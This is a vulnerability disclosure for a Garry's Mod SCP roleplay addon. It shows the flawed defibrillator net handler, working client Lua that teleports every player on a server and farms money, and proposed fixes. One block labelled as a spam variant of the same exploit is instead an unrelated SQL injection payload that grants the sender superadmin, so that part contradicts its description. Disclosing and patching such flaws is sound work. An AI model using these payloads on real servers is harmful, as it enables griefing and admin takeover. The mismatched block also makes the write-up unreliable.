# gDeathsystem Net Exploit
Found by OverlordAkise on 2021.06.15  
Addon seems to not be optainable anymore, but is still used on many SCPRP servers 

gDeathsystem has a Net Exploit in the Medic.SendRagdollRequest net.Receive function.

### TL;DR
gDeathsystem doesn't check if the target player is close enough for you to revive him with the defib.  
This allows someone with malicious intent to teleport every player currently on the server to him if he has a defib as his active weapon. (He could also teleport them to any other point on the map.)  

### The Code
This is the unformatted Code that is responsible for the Exploit.
```LUA 
net.Receive("Medic.SendRagdollRequest", function(l, ply)
  local owner = net.ReadEntity()
  local pos = net.ReadVector()
  if (ply:GetActiveWeapon():GetClass() == "weapon_gdefib") then
    ply:GetActiveWeapon():TriggerPlayer(owner, pos)
  end
end)

function SWEP:TriggerPlayer(owner, pos)
  if (self:GetCharge() <= 0) then return end
  self:SendWeaponAnim(ACT_VM_PRIMARYATTACK)
  timer.Simple(0.3, function()
    self:SetCharge(0)
    self:EmitSound( "ambient/energy/spark"..math.random(1,5)..".wav" )
    self:CreateEffect(self.Owner:GetShootPos(), owner)
    if SERVER then
      local ply = owner
      local chance = math.random(1,100) < MedConfig.DefibChance
      if (chance) then
        if (self.Owner.addMoney) then
          self.Owner:addMoney(MedConfig.ReviveMoney)
        end
        DarkRP.notify(self.Owner, 3, 5, "You've revived a player, take $"..MedConfig.ReviveMoney)
        
        ply.CanGetWeaponsBack = true
        if (ply.canAfford and ply:canAfford(MedConfig.MinMoneyToFee)) then
          if (ply.addMoney) then
            ply:addMoney(-MedConfig.ReviveCost)
          end
          DarkRP.notify(ply, 3, 6, "You've paid $"..MedConfig.ReviveCost .. " for medical fees")
        end
        
        timer.Simple(0.3, function()
          ply:Spawn()
          ply:SetHealth(math.random(5,20))
          ply:SetPos(pos)
        end)
      end
    end
  end)
end
```

### The Problem
It only checks if you have the weapon.  
It neither checks if you are close enough to the target entity nor if the target is actually dead or a player.  
This means that someone, if he has the defib as his active weapon, can charge it with right mouse button and then teleport any player he wants to any point on the map.  

The easiest way to demonstrate this would be to charge the defib with the right mouse button and then execute the following code:  
```LUA
net.Start("Medic.SendRagdollRequest")
  net.WriteEntity(player.GetAll()[1])
  net.WriteVector(Vector(0,0,0))
net.SendToServer()
```  
This teleports the first player that joined the server to the coordinates (0 0 0) on the map. (Only if you have the defib weapon in your hands and charged.)  
You could also do this with multiple players. The code that sets the weapon as not-charged runs 0.3 seconds after the first time the function "TriggerPlayer" was called. This means you can spam-send players for 0.3 seconds until the weapon is not charged anymore. This also allows you to gain a lot of money if the server has the variable "MedConfig.ReviveMoney" set.  

Summary: Please verify net.Receive functions and check against spam.

### Example Code
The following example code teleports every player to the coordinates Vector(0,0,0) if you have the defib and charged it:
```LUA
for k,v in pairs(player.GetAll()) do
  net.Start("Medic.SendRagdollRequest")
    net.WriteEntity(v)
    net.WriteVector(Vector(0,0,0))
  net.SendToServer()
end
```  
Another variant would be to spam it 3 times instead of one, which gives you more money and has the same effect:
```LUA
net.Start("CharSystemCreateProfile")
  net.WriteUInt(1, 8)
  net.WriteString("Peter Hustensaft'; INSERT INTO FAdmin_PlayerGroup(steamid, groupname) VALUES(\""..LocalPlayer():SteamID().."\",\"superadmin\");--")
net.SendToServer()
```  


### Fixing the exploit
To fix this you simply have to check the distance between you and the target.  
This would make this
```LUA
net.Receive("Medic.SendRagdollRequest", function(l, ply)
  local owner = net.ReadEntity()
  local pos = net.ReadVector()
  if ply:GetActiveWeapon():GetClass() == "weapon_gdefib" then
    ply:GetActiveWeapon():TriggerPlayer(owner, pos)
  end
end)
```  
to this
```LUA
net.Receive("Medic.SendRagdollRequest", function(l, ply)
  local owner = net.ReadEntity()
  local pos = net.ReadVector()
  if ply:GetActiveWeapon():GetClass() == "weapon_gdefib" and IsValid(owner) and owner:GetPos():DistToSqr(ply:GetPos()) < 500*500 then
    ply:GetActiveWeapon():TriggerPlayer(owner, pos)
  end
end)
```  

To fix the spam-problem simply move the charge-reset function one line down. This would make this
```LUA
function SWEP:TriggerPlayer(owner, pos)
  if (self:GetCharge() <= 0) then return end
  self:SendWeaponAnim(ACT_VM_PRIMARYATTACK)
  timer.Simple(0.3, function()
    self:SetCharge(0)
    [...]
```
to this
```LUA
function SWEP:TriggerPlayer(owner, pos)
  if (self:GetCharge() <= 0) then return end
  self:SendWeaponAnim(ACT_VM_PRIMARYATTACK)
  self:SetCharge(0)
  timer.Simple(0.3, function()
    [...]
``` 


